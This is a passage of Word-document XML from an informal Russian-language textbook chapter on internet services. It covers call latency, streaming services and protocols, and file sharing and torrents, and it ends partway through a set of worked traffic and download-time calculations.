      <w:r>
        <w:t>**150-300 мс** — терпимо (небольшая задержка)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**&gt; 300 мс** — хуёво (диалог разваливается)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Звонок Москва → Нью-Йорк.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>RTT (туда-обратно) = 120 мс → односторонняя задержка = 60 мс (отлично).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Звонок через спутниковый интернет (Starlink в самолёте):  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>RTT = 600 мс → односторонняя = 300 мс (говно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.8. Потоковые сервисы (Streaming): Смотрим и слушаем онлайн</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стриминг (streaming)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — воспроизведение видео/аудио </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>во время загрузки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (без скачивания всего файла).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Видеостриминг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные сервисы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сервис | Контент | Подписчиков | Стоимость |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|---------|-------------|-----------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>YouTube</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Всё подряд (бесплатно с рекламой) | ~2.5 млрд | Бесплатно (Premium $12/мес) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Netflix</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Сериалы, фильмы | ~260 млн | $15/мес |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Twitch</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Прямые трансляции игр | ~140 млн | Бесплатно (подписки на стримеров) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Disney+</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Disney, Marvel, Star Wars | ~150 млн | $8/мес |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HBO Max</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Сериалы (Игра Престолов) | ~100 млн | $15/мес |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Факт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Netflix </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>потребляет ~15% всего интернет-трафика в мире</w:t>
      </w:r>
      <w:r>
        <w:t>. Каждый вечер миллиарды гигабайт летят с серверов Netflix к людям. 📺</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Как работает стриминг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Традиционный способ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (как скачивание):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Скачиваешь **весь файл** (10 ГБ фильм)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ждёшь 30 минут</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Смотришь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стриминг</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Видео **разбито на чанки** (chunks) по 2-10 секунд</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Скачивается **первый чанк** (начинаешь смотреть через 1-2 секунды)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Пока смотришь первый чанк, скачивается **второй** → плавное воспроизведение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Протокол</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>HLS (HTTP Live Streaming)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DASH (Dynamic Adaptive Streaming over HTTP)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Адаптивный битрейт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Adaptive Bitrate Streaming):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Видео доступно в **нескольких качествах** (360p, 720p, 1080p, 4K)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если интернет **быстрый** → показывает 4K</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если интернет **медленный** → переключается на 360p (чтобы не было пауз)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Буферизация (buffering)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — загрузка нескольких чанков вперёд (чтобы компенсировать колебания скорости интернета).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Музыкальный стриминг</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Сервис | Подписчиков | Стоимость | Особенности |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------|-------------|-----------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Spotify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~600 млн | $10/мес | Самый популярный, подкасты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Apple Music</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~100 млн | $10/мес | Интеграция с Apple-устройствами |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Яндекс.Музыка</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~30 млн | ₽200/мес | Хороша для России (русская музыка) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>YouTube Music</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | ~100 млн | $10/мес | Интеграция с YouTube |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Битрейт</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Spotify: 96-320 Кбит/с (зависит от подписки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Apple Music: до 256 Кбит/с (AAC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Яндекс.Музыка: до 320 Кбит/с (MP3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.9. Файлообменные сервисы: Шарим файлы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Файлообменный сервис</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — способ передачи файлов между пользователями.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Облачные диски (уже обсудили)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Google Drive</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Dropbox</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>OneDrive</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: надёжно, есть версионирование.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>: ограничение по размеру (бесплатно 5-15 ГБ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>WeTransfer, SendAnywhere — для разовой отправки</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WeTransfer</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бесплатно до **2 ГБ** (без регистрации)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл хранится **7 дней**, потом удаляется</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SendAnywhere</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>До **10 ГБ** (без регистрации)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Одноразовая ссылка или 6-значный код</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Использование</w:t>
      </w:r>
      <w:r>
        <w:t>: быстро кинуть файл другу (проще, чем загружать в облако).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Торренты (BitTorrent) — P2P-раздача</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Торрент (BitTorrent)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — протокол </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>P2P (peer-to-peer)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для скачивания файлов </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>напрямую от других пользователей</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Torrent-файл** (или magnet-ссылка) — содержит инфо о файле и список раздающих (seeders)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Tracker** — сервер, который соединяет тебя с другими пользователями</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Скачивание** — файл скачивается **кусками** от разных пользователей одновременно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Раздача (seeding)** — после скачивания ты сам раздаёшь файл другим</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстро (скорость = сумма скоростей всех раздающих)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Децентрализация (нельзя "выключить" торрент — нет единого сервера)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легальные проблемы (90% торрентов — пиратский контент)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можешь скачать вирус вместо фильма</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Клиенты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**qBittorrent** (open-source, без рекламы)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**uTorrent** (был популярен, но засрали рекламой)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Transmission** (лёгкий, для Linux/macOS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Золотое правило</w:t>
      </w:r>
      <w:r>
        <w:t>: Проверяй комментарии и рейтинг торрента, прежде чем скачивать (чтобы не словить `virus.exe`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.5.10. Примеры задач и расчётов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Объём трафика для стриминга видео</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты смотришь YouTube-видео в качестве 1080p (битрейт 5 Мбит/с) в течение 2 часов. Сколько трафика потрачено?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Битрейт = 5 Мбит/с = 5 мегабит в секунду</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Объём} = \text{Битрейт} \times \text{Время} = 5 \text{ Мбит/с} \times (2 \times 3600 \text{ с}) = 5 \times 7200 = 36000 \text{ Мбит}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Переводим в гигабайты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>36000 \text{ Мбит} = \frac{36000}{8} = 4500 \text{ МБайт} = 4.5 \text{ ГБ}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~4.5 ГБ</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Сравнение стоимости облачного хранилища</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Тебе нужно хранить 500 ГБ фотографий. Сравни стоимость Google Drive, Dropbox, OneDrive на 1 год.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Google Drive</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>15 ГБ бесплатно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>100 ГБ — $1.99/мес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2 ТБ** — $9.99/мес (подходит для 500 ГБ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Годовая стоимость**: $9.99 × 12 = **$119.88**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Dropbox</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2 ГБ бесплатно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2 ТБ** — $9.99/мес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Годовая стоимость**: $9.99 × 12 = **$119.88**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OneDrive</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>5 ГБ бесплатно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>100 ГБ — $2/мес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1 ТБ** (с подпиской Microsoft 365 Family, включает Office) — $9.99/мес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Годовая стоимость**: $9.99 × 12 = **$119.88**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Все примерно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>одинаковы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (~$120/год). Но OneDrive даёт ещё и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Office 365</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Word, Excel, PowerPoint) → выгоднее, если юзаешь офис.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Скорость скачивания через торрент</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты скачиваешь фильм (4 ГБ) через торрент. В раздаче участвуют 10 пользователей, каждый отдаёт со скоростью 500 Кбит/с. Какова общая скорость скачивания? За какое время скачается файл?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Общая скорость</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>10 \times 500 = 5000 \text{ Кбит/с} = 5 \text{ Мбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Время скачивания</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Размер файла} = 4 \text{ ГБ} = 4 \times 8 = 32 \text{ Гбит}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Время} = \frac{32 \text{ Гбит}}{5 \text{ Мбит/с}} = \frac{32000 \text{ Мбит}}{5 \text{ Мбит/с}} = 6400 \text{ с} = 106.7 \text{ мин} \approx 1.8 \text{ часа}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Скорость </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>5 Мбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, время </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>~1.8 часа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (107 минут).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Задержка VoIP-звонка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты звонишь через Zoom из Владивостока в Калининград. Расстояние ~8000 км. Скорость света в оптоволокне ~200,000 км/с. Оцени минимальную задержку (latency).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
